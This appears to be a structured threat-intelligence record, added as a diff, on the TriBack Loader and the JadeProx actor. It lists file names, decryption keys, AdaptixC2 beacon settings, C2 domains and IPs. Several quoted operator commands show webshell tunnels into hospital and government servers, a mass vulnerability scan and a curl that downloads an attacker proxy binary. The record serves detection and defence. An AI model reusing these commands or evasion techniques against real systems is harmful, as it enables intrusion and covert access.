@@ -1,0 +1,750 @@
+{
+  "malware_family": "TriBack Loader",
+  "threat_actor": "JadeProx",
+  "platforms": [
+    "windows",
+    "linux"
+  ],
+  "summary": "JadeProx is a China-nexus cluster delivering phishing archives that chain LNK/VBS/MSI stagers into signed-binary DLL sideloading (TriBack Loader) to decrypt and run AdaptixC2 beacons or the Beagle backdoor from .dat/.log companion files. Four TriBack Loader variants share two-stage byte-reversal plus rolling-XOR decryption and rotate Win32 callback APIs (InitOnceExecuteOnce, TimerQueue, EtwpCreateEtwThread) to evade EDR, with hands-on post-exploitation tunnelling tooling (iox, suo5, Neo-reGeorg, nuclei, fscan) staged from an exposed Alibaba Cloud server. C2 and phishing domains are NameSilo-registered with Alibaba/Cloudflare hosting, and the same loader builder output recurs across all campaigns.",
+  "mitre_techniques": [
+    "T1595.002",
+    "T1583.001",
+    "T1190",
+    "T1566.001",
+    "T1204.002",
+    "T1059.005",
+    "T1547.001",
+    "T1574.001",
+    "T1036.005",
+    "T1140",
+    "T1218",
+    "T1027.013",
+    "T1070.004",
+    "T1071.001",
+    "T1090.001",
+    "T1573.001"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "file_name",
+      "value": "hostfxr.dll",
+      "context": "Malicious DLL sideloaded by signed ServiceHub.DataWarehouseHost.exe (variants 1 and 2)",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "ServiceHub.DataWarehouseHost.exe",
+      "context": "Signed Microsoft Service Hub CLR host abused for DLL sideloading",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "ServiceHub.DataWarehouseHost.dll",
+      "context": "Legitimate companion DLL in the bjh.zip and Honduras triad",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "ServiceHub.DataWarehouseHost.exe.dat",
+      "context": "Encrypted payload; loader appends .dat to its own filename",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "ServiceHub.DataWarehouseHost.exe.log",
+      "context": "Variant-2 encrypted payload companion found in Honduras archive",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "avk.dll",
+      "context": "G DATA avk.exe sideloaded DLL loader (variant 3, Claude-Pro theme)",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "NOVUpdate.exe",
+      "context": "Startup-folder EXE copied by VBS together with avk.dll and .dat",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "NOVUpdate.exe.dat",
+      "context": "Encrypted TriBack Loader payload placed in Startup folder for persistence",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "MpClient.dll",
+      "context": "TriBack Loader DLL of DeviceSync variant that reads .log from ProgramData",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "MpCopyAccelerator.pdb",
+      "context": "Signed binary abused for sideloading in variant 4 (DeviceSync.zip)",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "script.vbs",
+      "context": "VBS stager in Honduras archive that pops the decoy then runs the EXE",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "script.dat",
+      "context": "Bash script payload triggered via ftp.exe -s: in Claude-Pro variant",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "pdf.vbs",
+      "context": "VBS component of the Claude-Pro infection chain",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Claude.vbs",
+      "context": "MSI-installed VBS that drops the loader triad into Startup",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Claude.msi",
+      "context": "MSI installer delivered from claude-pro.com phishing portal",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "GolddTV.msi",
+      "context": "Standalone MSI with identical triad, C2 update-trellix.com:8080",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "DeviceSync.zip",
+      "context": "Archive of 2026-02-13 with only EXE+DLL, uploaded from Taiwan",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "bjh.zip",
+      "context": "DLL sideload package served over HTTP on port 18989 from staging server",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Estado de Cuenta.zip",
+      "context": "Honduras spearphishing archive using Cerveceria Hondurena payment lure",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Estado de Cuenta.lnk",
+      "context": "Shortcut with machine ID desktop-47cf5k7 that triggers script.vbs",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Claude-Pro-windows-x64.zip",
+      "context": "Archive hosted on claude-pro.com that delivers the MSI installer",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Claude-Pro-Relay-Technical-Overview.zip",
+      "context": "Phishing archive with PDF decoy, uploaded from Japan 2026-04-04",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "~del.vbs.bat",
+      "context": "Double-extension batch that deletes the VBS after 2 seconds",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\ProgramData\\Microsoft\\Windows.log",
+      "context": "Variant-4 encrypted payload path searched by MpClient.dll loader",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "_CL_177387",
+      "context": "Nested _CL_###### folder in phishing archives; hunt this path pattern",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "SquirrelTemp",
+      "context": "ProgramFiles subdirectory where the MSI drops VBS and loader triad",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "linux_amd64",
+      "context": "Garbled NPS proxy binary staged on the exposed Alibaba server",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "NPS",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "sys.log",
+      "context": "fscan network scanner renamed to sys.log on the operator server",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "fuckaliyun.sh",
+      "context": "Modified Aliyun-evasion script disabling Yundun host monitoring",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "export_name",
+      "value": "hostfxr_main_startupinfo",
+      "context": "hostfxr.dll export that holds the two-stage decryption stub",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "export_name",
+      "value": "ModuleMain",
+      "context": "Variant-3 avk.dll export (2026-01-18 timestamp) that triggers the loader",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "pmm3jPpdu8NYvVQ5JxRnQdP2vhxAU3nn",
+      "context": "32-byte rolling-XOR key (offset 5) of hostfxr.dll variant 1",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Qby2RSGkGIHumNrDlbt1OEHV3y2dVh5b",
+      "context": "32-byte rolling-XOR key reused by variants 2, 3 and 4",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "EtwpCreateEtwThread",
+      "context": "Undocumented ntdll API resolved at runtime for stealthy thread creation (variant 3)",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "mux:packer: unpack err, content length too large",
+      "context": "String from garbled NPS proxy binary on staging server",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "NPS",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "mux:packer: unpack content segment too large",
+      "context": "String from garbled NPS proxy binary on staging server",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "NPS",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "start_socks5()",
+      "context": "Unused function added to fuckaliyun.sh that downloads and nohups the SOCKS5 proxy",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "start_proxy()",
+      "context": "Unused function added to fuckaliyun.sh that builds xmrig-proxy from source",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "853f760f76de3201b0af0e41f1f65fba",
+      "context": "AdaptixC2 rc4_key of extracted Honduras beacon config (522 bytes)",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": "AdaptixC2",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "e067ffea77875ae0dc13d4ce045931d3",
+      "context": "AdaptixC2 rc4_key of open-directory beacon config (264 bytes)",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": "AdaptixC2",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "0xbe4c0149",
+      "context": "AdaptixC2 wmark shared by both extracted beacon configs",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": "AdaptixC2",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "0x7b7a9484",
+      "context": "AdaptixC2 build_hash of the Honduras beacon",
+      "specificity": "medium",
+      "evidence": "encrypted_config",
+      "origin_tool": "AdaptixC2",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "0xf2d5fab3",
+      "context": "AdaptixC2 build_hash of the open-directory beacon",
+      "specificity": "medium",
+      "evidence": "encrypted_config",
+      "origin_tool": "AdaptixC2",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "ftp.exe -s:./_CL_177530/…/script.dat",
+      "context": "LNK triggers bash stager via ftp.exe in Claude-Pro variant (parent: shortcut)",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "./suo5-linux-amd64 -t https://pacs.[REDACTED].org.vn/jmx/web.jsp -l 0.0.0.0:11111",
+      "context": "suo5 tunnel over Vietnamese hospital PACS JMX webshell (v2.1.0)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "./suo5-linux-amd64 -t https://pacs.[REDACTED].org.vn/jmx/suo5.jsp -l 0.0.0.0:11111",
+      "context": "Second suo5 webshell against the same hospital PACS server",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "python3 neoreg.py -k 11451 -u \"https://www.[REDACTED].gov.my/html/common/themes/top_css.jsp\" -p 11112",
+      "context": "Neo-reGeorg tunnel key 11451 against Malaysian MFA webshell",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "nuclei -list targets.txt -t ~/nuclei-templates/http_critical/ -silent -o output.txt",
+      "context": "Bulk critical-CVE scan of 14,653 Hong Kong education-sector URLs",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "python3 -m http.server 18989",
+      "context": "Persistent staging HTTP server serving the bjh.zip sideload package",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl https://dlrz-web.oss-cn-beijing.aliyuncs.com/uploads/socks5-server -o socks5-server",
+      "context": "start_socks5() downloads Go ELF proxy from actor Alibaba OSS bucket",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "import_name",
+      "value": "InitOnceExecuteOnce",
+      "context": "Callback API used to execute decrypted payload in variant 1 (EDR evasion)",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "import_name",
+      "value": "CreateTimerQueueTimer",
+      "context": "Timer-queue callback used for payload execution in variant 2",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "sylverixstrategy.com",
+      "context": "AdaptixC2 C2 of open-directory variant, created 2026-03-13, NameSilo",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "gouvvbo.top",
+      "context": "Honduras AdaptixC2 C2 hosting fake Municipality Piar tax portal",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "license.claude-pro.com",
+      "context": "C2 of Claude-Pro variant resolving to 8.217.190.58 (Alibaba US)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "claude-pro.com",
+      "context": "Phishing domain (2026-03-28, NameSilo) hosting malicious MSI packages",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "update-trellix.com",
+      "context": "C2 for GolddTV.msi on 192.252.186.62:8080, NameSilo",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "update-crowdstrike.com",
+      "context": "NameSilo domain resolving to 192.252.186.62",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "update-sentinelone.com",
+      "context": "NameSilo domain resolving to 192.252.186.62",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "vertextrust-advisors.com",
+      "context": "Fake Vertex Trust Advisors portal on 178.128.108.89 (April 2026)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "dlrz-web.oss-cn-beijing.aliyuncs.com",
+      "context": "Alibaba OSS bucket hosting the actor's socks5-server binary",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://dlrz-web.oss-cn-beijing.aliyuncs.com/uploads/socks5-server",
+      "context": "Download URL hardcoded in fuckaliyun.sh start_socks5()",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://43.106.71.28:8000/",
+      "context": "Exposed directory listing on the operator staging server",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "43.106.71.28",
+      "context": "JadeProx staging server, Alibaba Cloud Singapore, HTTP on port 8000",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "8.217.190.58",
+      "context": "license.claude-pro.com C2, AS45102 Alibaba US",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "192.252.186.62",
+      "context": "Update-themed C2 host (CTG Server) on port 8080",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "178.128.108.89",
+      "context": "DigitalOcean host of vertextrust-advisors.com phishing site",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "161.35.236.255",
+      "context": "DigitalOcean host of gouvvbo.top",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "104.21.60.96",
+      "context": "Cloudflare resolution of sylverixstrategy.com",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/v1/status",
+      "context": "AdaptixC2 beacon HTTP profile URI (open-directory config)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/updates/check.php",
+      "context": "AdaptixC2 beacon HTTP profile URI (open-directory config)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/content.html",
+      "context": "AdaptixC2 beacon HTTP profile URI (open-directory config)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "user_agent",
+      "value": "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0",
+      "context": "Beacon user agent in open-directory AdaptixC2 config",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "user_agent",
+      "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+      "context": "Beacon user agent in Honduras AdaptixC2 config",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "X-Beacon-Id: sVl9rKliaBp9mWruQqIqT3KRAkQ1SgKEebeF4X7hA/0gYq4SeF44nYLMrCi8hjvNJbm3W/o79gUWzkz1n7dvykcx6UjASIy6McMdMVcFnv949g+VmwzPuytQ+S/WDBlH5bqePzm4",
+      "context": "AdaptixC2 beacon identifier header from open-directory HTTP configuration",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "_octo=GH1.1.1819548244.1756364148",
+      "context": "GitHub analytics cookie in Honduras beacon config, linked to Tropic Trooper custom profile",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "pe",
+    "elf",
+    "script",
+    "archive"
+  ]
+}
